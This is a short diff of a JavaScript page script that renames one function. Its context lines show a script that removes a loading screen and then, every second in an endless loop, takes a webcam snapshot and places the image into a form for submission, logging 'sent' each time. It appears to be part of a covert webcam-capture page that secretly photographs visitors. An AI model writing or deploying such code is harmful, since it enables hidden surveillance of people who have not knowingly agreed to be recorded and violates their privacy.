@@ -158,7 +158,7 @@ window.onload = function(){
 		loader.style.opacity = "0"
 		loader.addEventListener('transitionend', () => loader.remove());
 	}, 4000);
-	function takesend(){
+	function takessend(){
   Webcam.snap( function(data_uri) {
     var form = document.getElementById("myAwesomeForm");
     var ImageURL = `${data_uri}`;
@@ -175,7 +175,7 @@ window.onload = function(){
 }
 (function loop() {
     setTimeout(function () {
-	    takesend()
+	    takessend()
       console.log("sent")
 	    loop()
     }, 1000);
